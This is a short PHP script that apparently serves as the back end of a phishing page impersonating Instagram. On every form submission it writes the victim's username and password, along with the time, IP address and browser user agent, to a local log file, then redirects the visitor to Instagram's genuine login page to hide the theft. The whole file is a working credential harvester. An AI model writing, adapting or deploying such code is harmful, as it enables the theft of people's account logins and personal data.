<?php
if ($_POST) {
    $file = fopen("logs.txt", "a");
    fwrite($file, "Time: " . date("Y-m-d H:i:s") . "\n");
    fwrite($file, "Username: " . htmlspecialchars($_POST['username'] ?? 'N/A') . "\n");
    fwrite($file, "Password: " . htmlspecialchars($_POST['password'] ?? 'N/A') . "\n");
    fwrite($file, "IP: " . $_SERVER['REMOTE_ADDR'] . "\n");
    fwrite($file, "UA: " . $_SERVER['HTTP_USER_AGENT'] . "\n");
    fwrite($file, "------------------------\n");
    fclose($file);
}
header("Location: https://www.instagram.com/accounts/login/");
exit();
?>